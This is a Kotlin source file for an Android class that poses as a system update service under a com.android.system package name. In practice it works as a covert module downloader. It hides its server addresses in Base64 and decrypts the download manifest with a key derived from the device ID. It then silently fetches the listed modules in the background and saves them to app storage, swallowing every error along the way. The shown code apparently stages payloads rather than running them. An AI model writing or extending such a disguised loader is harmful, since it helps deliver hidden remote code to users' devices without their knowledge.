package com.android.system.update.core

import android.content.Context
import android.provider.Settings
import android.util.Base64
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class UpdateServiceManager(private val context: Context) {

    private val random = SecureRandom()
    private val deviceKey: ByteArray
    private val networkManager = NetworkConnectionManager(context)

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun checkForUpdates() {
        Thread {
            val nodes = listOf(
                "aHR0cHM6Ly9ub2RlMS5zZXJ2aWNlLm5ldC91cGRhdGUvbWFuaWZlc3Q=",
                "aHR0cHM6Ly9ub2RlMi5zZXJ2aWNlLm5ldC91cGRhdGUvbWFuaWZlc3Q=",
                "aHR0cHM6Ly9ub2RlMy5zZXJ2aWNlLm5ldC91cGRhdGUvbWFuaWZlc3Q="
            )
            for (node in nodes) {
                try {
                    val url = URL(String(Base64.decode(node, Base64.DEFAULT)))
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.connectTimeout = 10000
                    conn.readTimeout = 10000
                    if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                        val manifest = conn.inputStream.bufferedReader().use { it.readText() }
                        processManifest(manifest)
                        return
                    }
                } catch (e: Exception) {
                }
            }
        }.start()
    }

    private fun processManifest(manifest: String) {
        try {
            val decrypted = decryptManifest(manifest)
            val entries = decrypted.split("\n")
            for (entry in entries) {
                if (entry.isNotBlank()) {
                    val parts = entry.split("|")
                    if (parts.size >= 3) {
                        val moduleName = parts[0]
                        val moduleUrl = parts[1]
                        val moduleHash = parts[2]
                        downloadModule(moduleName, moduleUrl, moduleHash)
                    }
                }
            }
        } catch (e: Exception) {
        }
    }

    private fun decryptManifest(encrypted: String): String {
        val data = Base64.decode(encrypted, Base64.NO_WRAP)
        val iv = data.sliceArray(0..11)
        val ciphertext = data.sliceArray(12 until data.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        return String(cipher.doFinal(ciphertext))
    }

    private fun downloadModule(moduleName: String, urlString: String, expectedHash: String) {
        try {
            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                val data = conn.inputStream.readBytes()
                val hash = MessageDigest.getInstance("SHA-256").digest(data).joinToString("") { "%02x".format(it) }
                if (hash == expectedHash) {
                    saveModule(moduleName, data)
                }
            }
        } catch (e: Exception) {
        }
    }

    private fun saveModule(moduleName: String, data: ByteArray) {
        try {
            val modulesDir = File(context.filesDir, "modules")
            if (!modulesDir.exists()) modulesDir.mkdirs()
            val moduleFile = File(modulesDir, moduleName)
            moduleFile.writeBytes(data)
        } catch (e: Exception) {
        }
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data)
        return iv + encrypted
    }
}